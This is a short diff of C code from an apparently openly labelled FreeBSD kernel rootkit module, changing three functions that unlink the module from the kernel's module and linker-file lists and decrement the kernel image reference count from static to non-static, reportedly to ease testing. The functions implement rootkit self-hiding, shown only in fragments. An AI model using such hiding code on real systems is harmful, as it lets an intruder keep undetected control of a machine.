@@ -55,7 +55,7 @@ static moduledata_t rootkit_mod = {
         NULL
 };
 
-static int remove_module_from_kernel(char * name){
+int remove_module_from_kernel(char * name){
 	struct module * mod;
 	int result = 1;
 	sx_xlock(&modules_sx);
@@ -77,7 +77,7 @@ static int remove_module_from_kernel(char * name){
 }
 
 // Uncommented to make testing eaiser
-static int remove_linker_file(char * name){
+int remove_linker_file(char * name){
 	struct linker_file  *lf;
 	int result = 1;
 
@@ -102,7 +102,7 @@ static int remove_linker_file(char * name){
 	return result;
 }
 
-static void decrement_kernel_image_ref_count(void){
+void decrement_kernel_image_ref_count(void){
 	(&linker_files)->tqh_first->refs--;
 }
 
